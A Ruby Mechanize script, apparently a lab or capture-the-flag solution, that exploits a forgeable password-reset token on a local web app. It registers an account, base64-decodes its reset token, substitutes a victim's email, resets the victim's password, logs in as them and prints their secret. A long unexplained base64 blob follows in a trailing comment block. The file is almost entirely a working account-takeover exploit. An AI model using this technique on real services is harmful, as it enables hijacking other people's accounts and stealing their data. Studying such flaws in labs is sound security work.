require 'mechanize'
require 'base64'

TARGET = 'j.osterman@watchmen.net'
EMAIL  = 'fox@fox.com'
PASS   = '123456789'

Mechanize.new.instance_eval do
    
  # Create a new user account
  get 'http://localhost:3000/users/new'

  page.forms.first.tap do |f|
    f['user[email]']                 = EMAIL
    f['user[password]']              = PASS
    f['user[password_confirmation]'] = PASS
    f.submit
  end

  # Reset the password
  get '/password_reset_request/new'

  page.forms.first.tap do |f|
    f['email']      = EMAIL
    f.submit
  end

  # Now we magically grab the token we are given
  token = 'ZW1haWw9Zm94QGZveC5jb20mZXhwaXJlcz0xNDI0OTUzOTIw'
  puts '[+] Reading the token...' + token

  # Decode the token and substitute in target
  decoded_token = Base64.decode64(token)
  
  puts '[+] Substituting target email: ' + TARGET
  new_token = decoded_token.gsub(EMAIL, TARGET)

  new_token = Base64.urlsafe_encode64(new_token)
  puts '[+] Encoding new token: ' + new_token

  # Reset the password
  puts '[+] Resetting the password'
  get '/password_reset/new?token=' + new_token

  page.forms.first.tap do |f|
    f['user[password]']              = PASS
    f['user[password_confirmation]'] = PASS
    f.submit
  end

  # Sign in as target
  get '/session/new'

  page.forms.first.tap do |f|
    f['email']    = TARGET
    f['password'] = PASS
    f.submit
  end

  # Print the secret
  puts '[+] Success!'
  puts page.search('.secret').text.strip
end

=begin
eqVFL0CfBZOoT6HbwOolEDh8hgtr1F08rRUfWKesESpu4xecpE6QIWAJZQhuZDGCajFa4wUYPdDiM/1yoF0o0iSA9z0Y0a4ym9Z
AUw1sq+Tv65GSo7FdJKcFIBmcYTOBLAgwld1l24xgHZhQaCLfOCpURWLoAQdiOQ8muAYCCqITNIerkuxXKAIN2/48W9Sj/UTfAU
T7QO04qxlLuFz7GYMQj+Jq0avEDadGudHjLwnLGOE6B0CtW5C7XLUo60+6epnrLqbnFKFxNu9B3fL/qeG/ZQdd/AWy97qgwd//6
dv+JvPRfxAJJLpLj8MXygqcPrPqYo15BEtFaCfKnmLHVg1mhkBHos/ZxqrIZ4VK5/AfKpJoJQ0VVOEWuk/R1vSilAn5LL1/AI3OJ
cmp/ULE+PN+OUSe4eawE/EoYr9kjxrfF6KkAPIrbidVW/K8Xh7xgVhLISkAbFCDr87TGHo8KGs5QH54Z54TOOp0eiCE8iH7SRg76
06wUPVPFFohBVu0sSkxByJ/vDCU1kX1ZUFdkexdgVmvmKLxBj5x6UpmPOBE6MKZSGeKJI04cnogb+jAOwNXgJdeiGuwKTMzqmPAB
ybKUssK0JNkM5OypYM3SWHvlKgsv4Kf/I/uchTy95e1DSNt+eHLGE59iJfnxTDdpe5jDm5ANdAZCAihlPCs+oMZMvkmKgcwigJsfn
m/G9WDeEm8N38MAscKAlcFI+yLUgwWutgZDxrpMCfmlYPewkqdH1r5G/XzsmOc6vXbk78KHsGfh5S7dmg0aUpDospLic1MJGQlDiL
NDqrVyhQYY8FlPeAzuRmQOnaRqVNdcAucb+zLMiOOVTv//56J29vSGwSmKMim6Rk0nCEmdTtdWHugnIexeI5Y2RgddJZrcNYV9Z8y
kqdlPgDPE22q1Evai90pL11iGDmTDoEBF8W5SBFDoSvEKWFAdLL61rnPGGimhiIeOg2GqOqYeEsB44qy31OzuqHbuDp4bPo99NqWj9
4ZFjkcQ+Z+7bs3I0SRHa7CXUxCZ//65ux0bWdpgzjB3ttpAYgFNvDX8d0rVxb69jSDRZy/5uPsu9IYyKygvW02LtljPC5e4pnaZzUf
jYZQ7CNZMBTiqIt8xZ8Tv6DInIJXHjn9W4Xx1p9AGr9QPSL9/CyT13DG9zC6/IZn3HqFLjXazVziaBkM34Br+8pZNvHr9Y7opQsBNf
qRJU6MkflHy6m8huQJmEb1gQLGuQYU9Ws2HrP9eoTrVmf0Ub+UQSGvHnmE1iMPGKttbQRqQGWXt0kuHEBfl/8TMc6ecPTyRjC2AbPN
UpiWr+P6KqHcLzy9Gzd9nwn2DEeextY2eD2F60471fq3g2hEGjeg70tG+g==  
=end